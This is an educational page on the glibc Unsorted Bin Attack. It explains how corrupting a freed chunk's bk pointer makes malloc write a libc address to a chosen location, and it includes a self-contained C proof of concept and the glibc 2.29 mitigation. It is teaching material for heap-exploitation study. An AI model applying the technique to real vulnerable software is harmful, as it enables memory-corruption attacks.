#import "../../../../typst-theme.c.typ": project
#show: project

#metadata(
  (
    title: "Unsorted Bin Attack",
    description: "Exploiting the Unsorted Bin removal logic to write a large libc address to an arbitrary location.",
    date: "2025-12-26",
    order: 39,
  ),
)<frontmatter>

= glibc Allocator: Unsorted Bin Attack

== Introduction

The "Unsorted Bin Attack" is a classic heap exploitation technique that allows an attacker to write a large value (specifically, the address of the Unsorted Bin head in `main_arena`) to an arbitrary memory location. While it doesn't provide full control over *what* is written, it is extremely useful for:
1. *Overwriting loop counters* or limit variables to trigger further overflows.
2. *Modifying `global_max_fast`* in libc to enable fastbin attacks for larger chunk sizes.
3. *Corrupting pointers* to point to the heap/libc.

In modern glibc (2.29+), this attack is mitigated by additional checks in the Unsorted Bin removal logic.

== Prerequisites
- *Unsorted Bin Corruption*: Ability to overwrite the `bk` pointer of a chunk while it is in the Unsorted Bin.
- *GLIBC Version*: Effective on glibc < 2.29. Newer versions check if `victim->bk->fd == victim`.

== Example Code

This PoC demonstrates how to overwrite a stack variable with a libc address.

```c
#include <stdio.h>
#include <stdlib.h>

int main(){
	fprintf(stderr, "This file demonstrates unsorted bin attack by write a large unsigned long value into stack\n");

	unsigned long stack_var=0;
	fprintf(stderr, "Target on stack at %p. Current value: %ld\n\n", &stack_var, stack_var);

	unsigned long *p=malloc(400);
	fprintf(stderr, "Allocated first chunk at: %p\n", p);

	// Allocate another chunk to avoid consolidating p with the top chunk
	malloc(500);

	// Free the first chunk; it enters the Unsorted Bin
	free(p);
	fprintf(stderr, "Chunk freed. victim->bk points to: %p\n",(void*)p[1]);

	//------------VULNERABILITY-----------
	// Overwrite victim->bk with target_address - 2*sizeof(long)
	p[1]=(unsigned long)(&stack_var-2);
	fprintf(stderr, "Vulnerability: Overwriting victim->bk with %p\n\n",(void*)p[1]);
	//------------------------------------

	// Trigger the removal from Unsorted Bin
	malloc(400);

fprintf(stderr, "After malloc, the target has been rewritten with a libc address:\n");
	fprintf(stderr, "%p: %p\n", &stack_var, (void*)stack_var);
}
```

== Attack Flow Explained

=== 1. The Unsorted Bin State

When a chunk (not fastbin-sized) is freed and is not adjacent to the top chunk, it is placed into the *Unsorted Bin*. The Unsorted Bin is a circular doubly-linked list. For a single freed chunk `P`, its `fd` and `bk` pointers both point to the `main_arena`'s unsorted bin head.

=== 2. The Vulnerability: Corrupting BK

The attack requires the ability to overwrite the `bk` pointer of a freed chunk in the Unsorted Bin. We set `P->bk` to `Target - 2 * SIZE_SZ` (where `SIZE_SZ` is 8 on x64). This is because the allocator will later try to access `P->bk->fd`, which corresponds to the address at `(Target - 2 * SIZE_SZ) + 2 * SIZE_SZ = Target`.

=== 3. Removal from Unsorted Bin

When `malloc()` is called with a size that can be satisfied by the Unsorted Bin (or during the sorting process), the allocator removes the chunk `P` from the list using the following logic:

```c
victim = unsorted_chunks (av)->bk; // The chunk to be removed
bck = victim->bk;                  // Our corrupted pointer

// ... some checks ...

unsorted_chunks (av)->bk = bck;
bck->fd = unsorted_chunks (av);    // THE CRITICAL WRITE
```

The line `bck->fd = unsorted_chunks (av)` effectively performs:
`*(Target) = unsorted_chunks (av)`

Since `unsorted_chunks (av)` is a pointer within the `libc` data section (specifically the `main_arena`), our `Target` variable is now overwritten with a very large 64-bit address.

== Modern Mitigations (glibc 2.29+)

In glibc 2.29, a check was added to ensure the integrity of the Unsorted Bin list before removal:

```c
if (__glibc_unlikely (victim->bk->fd != victim))
    malloc_printerr ("malloc(): unsorted-bin lib double linked list corrupted");
```

Because our corrupted `victim->bk` (the stack address) does not point back to `victim`, this check fails and the program crashes. This effectively killed the Unsorted Bin attack in its classic form.
